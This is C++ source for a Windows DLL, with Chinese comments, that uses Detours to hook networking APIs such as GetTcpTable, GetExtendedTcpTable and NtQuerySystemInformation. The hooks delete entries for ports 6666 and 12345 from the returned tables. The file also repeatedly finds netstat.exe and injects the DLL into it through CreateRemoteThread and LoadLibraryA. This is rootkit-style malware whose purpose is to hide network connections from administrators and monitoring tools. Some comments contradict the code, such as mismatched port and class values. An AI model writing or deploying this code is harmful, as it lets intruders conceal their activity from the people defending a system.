// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"

#include <windows.h>
#include "detours.h"
#include <iostream>
#include <Winsock2.h>
#include <string>
#include <iphlpapi.h>
#include <Tlhelp32.h>
#include <tchar.h> 
#include <winternl.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "Ws2_32.lib")

// 定义原始函数指针类型
typedef DWORD(WINAPI* GetTcpTable_t)(PMIB_TCPTABLE, PULONG, BOOL);
typedef DWORD(WINAPI* GetUdpTable_t)(PMIB_UDPTABLE, PULONG, BOOL);

// 声明原始函数指针
GetTcpTable_t Real_GetTcpTable = GetTcpTable;
GetUdpTable_t Real_GetUdpTable = GetUdpTable;

// Hook 的 GetTcpTable 函数
DWORD WINAPI Hooked_GetTcpTable(PMIB_TCPTABLE pTcpTable, PULONG pdwSize, BOOL bOrder)
{
	::MessageBoxA(NULL, "Hooked_GetTcpTable!!!", "tips", MB_OK);
	DWORD result = Real_GetTcpTable(pTcpTable, pdwSize, bOrder);
	if (result == NO_ERROR && pTcpTable != nullptr)
	{
		// 遍历 TCP 表，隐藏特定连接
		for (DWORD i = 0; i < pTcpTable->dwNumEntries; ++i)
		{
			PMIB_TCPROW pRow = &pTcpTable->table[i];
			// 替换下面的条件为你要隐藏的连接条件
			if (ntohs((u_short)pRow->dwLocalPort) == 6666 || ntohs((u_short)pRow->dwRemotePort) == 6666)
			{
				// 覆盖当前行，减少连接计数
				if (i < pTcpTable->dwNumEntries - 1)
				{
					memcpy(pRow, &pTcpTable->table[pTcpTable->dwNumEntries - 1], sizeof(MIB_TCPROW));
				}
				pTcpTable->dwNumEntries--;
				i--; // 调整索引，重新检查被覆盖的行
			}
		}
	}
	return result;
}

// Hook 的 GetUdpTable 函数
DWORD WINAPI Hooked_GetUdpTable(PMIB_UDPTABLE pUdpTable, PULONG pdwSize, BOOL bOrder)
{
	DWORD result = Real_GetUdpTable(pUdpTable, pdwSize, bOrder);
	if (result == NO_ERROR && pUdpTable != nullptr)
	{
		// 遍历 UDP 表，隐藏特定连接
		for (DWORD i = 0; i < pUdpTable->dwNumEntries; ++i)
		{
			PMIB_UDPROW pRow = &pUdpTable->table[i];
			// 替换下面的条件为你要隐藏的连接条件
			if (ntohs((u_short)pRow->dwLocalPort) == 12345 || ntohs((u_short)pRow->dwLocalPort) == 12345)
			{
				// 覆盖当前行，减少连接计数
				if (i < pUdpTable->dwNumEntries - 1)
				{
					memcpy(pRow, &pUdpTable->table[pUdpTable->dwNumEntries - 1], sizeof(MIB_UDPROW));
				}
				pUdpTable->dwNumEntries--;
				i--; // 调整索引，重新检查被覆盖的行
			}
		}
	}
	return result;
}

typedef NTSTATUS(NTAPI* NtQuerySystemInformationType)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);


NtQuerySystemInformationType RealNtQuerySystemInformation = NULL;

typedef struct _SYSTEM_TCP_CONNECTION_INFORMATION {
	ULONG State;
	ULONG LocalAddr;
	USHORT LocalPort;
	ULONG RemoteAddr;
	USHORT RemotePort;
	ULONG ProcessId;
} SYSTEM_TCP_CONNECTION_INFORMATION, * PSYSTEM_TCP_CONNECTION_INFORMATION;

typedef struct _SYSTEM_TCP_CONNECTIONS_INFORMATION {
	ULONG NumberOfEntries;
	SYSTEM_TCP_CONNECTION_INFORMATION Connections[1];
} SYSTEM_TCP_CONNECTIONS_INFORMATION, * PSYSTEM_TCP_CONNECTIONS_INFORMATION;

NTSTATUS NTAPI HookedNtQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
) {
	NTSTATUS status = RealNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if (SystemInformationClass == 0x40) // 假设 12 是 SystemNetworkConnectionsInformation 的值
	{
		PSYSTEM_TCP_CONNECTIONS_INFORMATION TcpInfo = (PSYSTEM_TCP_CONNECTIONS_INFORMATION)SystemInformation;
		ULONG EntryCount = TcpInfo->NumberOfEntries;

		for (ULONG i = 0; i < EntryCount; i++)
		{
			if (TcpInfo->Connections[i].LocalPort == htons(6666)) // 过滤本地端口为8080的连接
			{
				// 将后面的结构体向前移动，覆盖掉当前项
				memmove(&TcpInfo->Connections[i],
					&TcpInfo->Connections[i + 1],
					(EntryCount - i - 1) * sizeof(SYSTEM_TCP_CONNECTION_INFORMATION));
				TcpInfo->NumberOfEntries--;
				EntryCount--;
				i--; // 重新检查当前位置
			}
		}
	}

	return status;
}


typedef DWORD(WINAPI* GetExtendedTcpTableType)(
	PVOID pTcpTable,
	PDWORD pdwSize,
	BOOL bOrder,
	ULONG ulAf,
	TCP_TABLE_CLASS TableClass,
	ULONG Reserved
	);

// Pointer to hold the original GetExtendedTcpTable function
GetExtendedTcpTableType RealGetExtendedTcpTable = NULL;


// Hook function
DWORD WINAPI HookedGetExtendedTcpTable(
	PVOID pTcpTable,
	PDWORD pdwSize,
	BOOL bOrder,
	ULONG ulAf,
	TCP_TABLE_CLASS TableClass,
	ULONG Reserved
) {
	::MessageBoxA(NULL, "HookedGetExtendedTcpTable!!!", "tips", MB_OK);
	// Call the original function first
	DWORD dwResult = RealGetExtendedTcpTable(pTcpTable, pdwSize, bOrder, ulAf, TableClass, Reserved);
	if (dwResult == NO_ERROR && pTcpTable != NULL) {
		PMIB_TCPTABLE2 pTcpTable2 = (PMIB_TCPTABLE2)pTcpTable;
		for (DWORD i = 0; i < pTcpTable2->dwNumEntries; i++) {
			// Example: Hide connections on local port 12345
			if (ntohs((u_short)pTcpTable2->table[i].dwLocalPort) == 6666 ||
				ntohs((u_short)pTcpTable2->table[i].dwRemotePort) == 6666
				) {
				// Shift remaining entries up to hide this entry
				for (DWORD j = i; j < pTcpTable2->dwNumEntries - 1; j++) {
					pTcpTable2->table[j] = pTcpTable2->table[j + 1];
				}
				pTcpTable2->dwNumEntries--;
				i--;  // Check the new entry at this index
			}
		}
	}
	return dwResult;
}

typedef DWORD(WINAPI* GetIpNetTableType)(
	PMIB_IPNETTABLE pIpNetTable,
	PULONG pdwSize,
	BOOL bOrder
	);

GetIpNetTableType RealGetIpNetTable = NULL;

DWORD WINAPI HookedGetIpNetTable(
	PMIB_IPNETTABLE pIpNetTable,
	PULONG pdwSize,
	BOOL bOrder
) {
	::MessageBoxA(NULL, "HookedGetIpNetTable!!!", "tips", MB_OK);
	DWORD dwResult = RealGetIpNetTable(pIpNetTable, pdwSize, bOrder);

	if (dwResult == NO_ERROR && pIpNetTable != NULL) {
		PMIB_IPNETTABLE pTable = pIpNetTable;
		for (DWORD i = 0; i < pTable->dwNumEntries; i++) {
			// 示例: 隐藏特定端口信息（这里假设某个 IP 地址或某种条件）
			if (pTable->table[i].dwAddr == 1) {
				for (DWORD j = i; j < pTable->dwNumEntries - 1; j++) {
					pTable->table[j] = pTable->table[j + 1];
				}
				pTable->dwNumEntries--;
				i--;  // 检查新的条目
			}
		}
	}

	return dwResult;
}

typedef DWORD(WINAPI* GetTcpStatisticsType)(PMIB_TCPSTATS pStats);

GetTcpStatisticsType RealGetTcpStatistics = NULL;

DWORD WINAPI HookedGetTcpStatistics(PMIB_TCPSTATS pStats) {
	::MessageBoxA(NULL, "HookedGetTcpStatistics!!!", "tips", MB_OK);
	DWORD dwResult = RealGetTcpStatistics(pStats);

	if (dwResult == NO_ERROR && pStats != NULL) {
		// 示例：在这里处理统计信息，比如过滤特定端口
		// 这个函数主要是统计信息，所以通常不包括具体端口信息
		// 如果需要处理具体连接，可以考虑其他API如 GetTcpTable
	}

	return dwResult;
}

void AttachHooks() {
	// Detour transaction to attach our hook
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());

	// Attach our hook function
	RealGetExtendedTcpTable = (GetExtendedTcpTableType)DetourFindFunction("iphlpapi.dll", "GetExtendedTcpTable");
	DetourAttach(&(PVOID&)RealGetExtendedTcpTable, HookedGetExtendedTcpTable);

	DetourTransactionCommit();
}

void DetachHooks() {
	// Detour transaction to detach our hook
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());

	// Detach our hook function
	DetourDetach(&(PVOID&)RealGetExtendedTcpTable, HookedGetExtendedTcpTable);

	DetourTransactionCommit();
}

void InjectDLL(DWORD processID, const char* dllPath) {
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
	if (hProcess == NULL) {
		std::cerr << "Failed to open process: " << GetLastError() << std::endl;
		return;
	}

	void* pLibRemote = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
	if (pLibRemote == NULL) {
		std::cerr << "Failed to allocate memory in target process: " << GetLastError() << std::endl;
		CloseHandle(hProcess);
		return;
	}

	if (!WriteProcessMemory(hProcess, pLibRemote, (void*)dllPath, strlen(dllPath) + 1, NULL)) {
		std::cerr << "Failed to write to process memory: " << GetLastError() << std::endl;
		VirtualFreeEx(hProcess, pLibRemote, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return;
	}

	HMODULE hKernel32 = GetModuleHandleA("Kernel32");
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA"), pLibRemote, 0, NULL);
	if (hThread == NULL) {
		std::cerr << "Failed to create remote thread: " << GetLastError() << std::endl;
		VirtualFreeEx(hProcess, pLibRemote, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return;
	}

	WaitForSingleObject(hThread, INFINITE);
	VirtualFreeEx(hProcess, pLibRemote, 0, MEM_RELEASE);
	CloseHandle(hThread);
	CloseHandle(hProcess);
}

void MonitorNetstat() {
	const char* dllPath = "C:\\hk.dll";
	while (true) {
		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnapshot == INVALID_HANDLE_VALUE) {
			std::cerr << "Failed to create snapshot: " << GetLastError() << std::endl;
			return;
		}

		PROCESSENTRY32 pe;
		pe.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(hSnapshot, &pe)) {
			do {
				if (_tcsicmp(pe.szExeFile, _T("netstat.exe")) == 0) {
					InjectDLL(pe.th32ProcessID, dllPath);
				}
			} while (Process32Next(hSnapshot, &pe));
		}

		CloseHandle(hSnapshot);
		Sleep(1); // Check every second
	}
}


//GetTcpStatistics

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

	//HANDLE hd = LoadLibraryA("C:\\Users\\Administrator\\Desktop\\yj\\vs_project\\hk\\x64\\Release\\hk.dll");
	//if (hd)
	//{
	//	CloseHandle(hd);
	//}
	// 
	MonitorNetstat();

	AttachHooks();

	// Attach the hooks


	// Example usage of GetExtendedTcpTable to verify the hook
	DWORD dwSize = 0;
	GetExtendedTcpTable(NULL, &dwSize, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
	PMIB_TCPTABLE2 pTcpTable = (PMIB_TCPTABLE2)malloc(dwSize);
	if (pTcpTable != NULL) {
		if (GetExtendedTcpTable(pTcpTable, &dwSize, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) == NO_ERROR) {
			for (DWORD i = 0; i < pTcpTable->dwNumEntries; i++) {
				OutputDebugStringA("TCP Local Port: "); 
				OutputDebugStringA(std::to_string((u_short)pTcpTable->table[i].dwLocalPort).c_str());
				OutputDebugStringA("\n");
				OutputDebugStringA("TCP Remote Port: ");
				OutputDebugStringA(std::to_string((u_short)pTcpTable->table[i].dwRemotePort).c_str());
				OutputDebugStringA("\n");
			}
		}
		free(pTcpTable);
	}

	// Detach the hooks before exiting
	DetachHooks();
	return 0;
}

// DLL 入口点
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourAttach(&(PVOID&)Real_GetTcpTable, Hooked_GetTcpTable);
		DetourAttach(&(PVOID&)Real_GetUdpTable, Hooked_GetUdpTable);
		RealGetExtendedTcpTable = (GetExtendedTcpTableType)DetourFindFunction("iphlpapi.dll", "GetExtendedTcpTable");
		DetourAttach(&(PVOID&)RealGetExtendedTcpTable, HookedGetExtendedTcpTable);
		RealNtQuerySystemInformation = (NtQuerySystemInformationType)DetourFindFunction("ntdll.dll", "NtQuerySystemInformation");
		RealGetIpNetTable = (GetIpNetTableType)DetourFindFunction("iphlpapi.dll", "GetIpNetTable");
		DetourAttach(&(PVOID&)RealGetIpNetTable, HookedGetIpNetTable);
		DetourAttach(&(PVOID&)RealNtQuerySystemInformation, HookedNtQuerySystemInformation);
		RealGetTcpStatistics = (GetTcpStatisticsType)GetProcAddress(GetModuleHandle(L"iphlpapi.dll"), "GetTcpStatistics");
		DetourAttach(&(PVOID&)RealGetTcpStatistics, HookedGetTcpStatistics);
		DetourTransactionCommit();
		Sleep(3000);
		//::MessageBoxA(NULL, "hook success!!!", "tips", MB_OK);
		break;
	case DLL_PROCESS_DETACH:
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourDetach(&(PVOID&)Real_GetTcpTable, Hooked_GetTcpTable);
		DetourDetach(&(PVOID&)Real_GetUdpTable, Hooked_GetUdpTable);
		RealGetExtendedTcpTable = (GetExtendedTcpTableType)DetourFindFunction("iphlpapi.dll", "GetExtendedTcpTable");
		DetourDetach(&(PVOID&)RealGetExtendedTcpTable, HookedGetExtendedTcpTable);
		//RealNtQuerySystemInformation = (NtQuerySystemInformationType)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
		DetourDetach(&(PVOID&)RealNtQuerySystemInformation, HookedNtQuerySystemInformation);
		DetourDetach(&(PVOID&)RealGetIpNetTable, HookedGetIpNetTable);
		DetourDetach(&(PVOID&)RealGetTcpStatistics, HookedGetTcpStatistics);
		DetourTransactionCommit();
		break;
	}
	return TRUE;
}
